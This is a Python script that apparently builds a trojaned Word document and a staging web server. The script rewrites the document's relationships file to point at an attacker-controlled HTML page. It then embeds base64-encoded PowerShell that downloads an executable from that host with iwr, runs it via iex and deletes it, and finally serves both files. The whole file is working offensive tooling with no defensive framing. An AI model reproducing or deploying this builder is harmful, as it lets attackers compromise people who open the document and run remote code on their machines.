from base64 import b64encode
from os import listdir, remove, rename
from shutil import copyfile, copytree, make_archive, rmtree
from xml.etree import ElementTree as ET

from server import init_server


def build_payload(host: str, port: int, build_directory: str) -> str:

    payload_build_path  = "bin"
    payload_name        = next(file for file in listdir(payload_build_path) if file.endswith(".exe"))
    payload_target_path = f"$($env:USERPROFILE + '/Desktop/' + '{payload_name}')"
    html_name           = "index.html"
    html_build_path     = f"server/{html_name}"

    copyfile(f"{build_directory}/{html_name}", html_build_path)

    powershell_commands = "; ".join([
        f"iwr http://{host}:{port}/{payload_build_path}/{payload_name} -OutFile {payload_target_path}",
        f"{payload_target_path} | iex",
        f"rm -Force -Path {payload_target_path}"
    ]).encode("utf-8")

    with open("build/href.txt") as f:
        staged_payload = f.read().replace("{ staged_commands }", b64encode(powershell_commands).decode("utf-8"))

    with open(html_build_path, "r+") as f:
        new_data = f.read().replace("{ staged_payload }", staged_payload)
        f.seek(0)
        f.write(new_data)

    return html_build_path


def build_trojan(host: str, port: int, build_directory: str) -> str:
    
    trojan_name        = "trojan"
    trojan_build_path  = f"{build_directory}/docx"
    trojan_target_path = "docx"
    trojan_file_name   = f"{trojan_name}.docx"

    copytree(trojan_build_path, trojan_target_path)

    with open(f"{trojan_target_path}/word/_rels/document.xml.rels", "r+") as f:
        new_data = f.read().replace("{ staged_html }", f"http://{host}:{port}/server")
        f.seek(0)
        f.write(new_data)

    make_archive(trojan_name, "zip", trojan_target_path)
    rename(f"{trojan_name}.zip", trojan_file_name)
    rmtree(trojan_target_path)

    return trojan_file_name


def main():
    
    build_directory = "build"
    root = ET.parse("config.xml").getroot()
    get_element_from_host = lambda element: root.find(element).text
    server_address = (get_element_from_host("name"), int(get_element_from_host("port")))

    staged_trojan_path = build_trojan(*server_address, build_directory)
    staged_html_path   = build_payload(*server_address, build_directory)
    init_server(*server_address)

    # Clean up when the server closes
    remove(staged_trojan_path)
    remove(staged_html_path)


if __name__ == "__main__":
    main()
